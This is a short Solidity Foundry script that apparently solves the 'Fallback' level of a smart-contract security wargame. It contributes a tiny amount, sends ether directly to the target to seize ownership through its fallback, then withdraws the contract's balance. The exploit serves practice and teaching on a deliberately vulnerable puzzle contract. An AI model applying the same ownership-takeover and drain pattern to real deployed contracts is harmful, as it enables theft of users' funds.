// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Script, console } from "forge-std/Script.sol";
import { Fallback } from "@puzzles/1/Fallback.sol";

contract FallbackSolution is Script {
    error Fallback_CallFailed();

    function run(address target) public {
        Fallback puzzleContract = Fallback(payable(target));

        vm.startBroadcast();
        puzzleContract.contribute{value: 1}();
        (bool success, ) = target.call{value: 1}("");
        if(!success) {
            revert Fallback_CallFailed();
        }
        puzzleContract.withdraw();
        vm.stopBroadcast();
    }
}
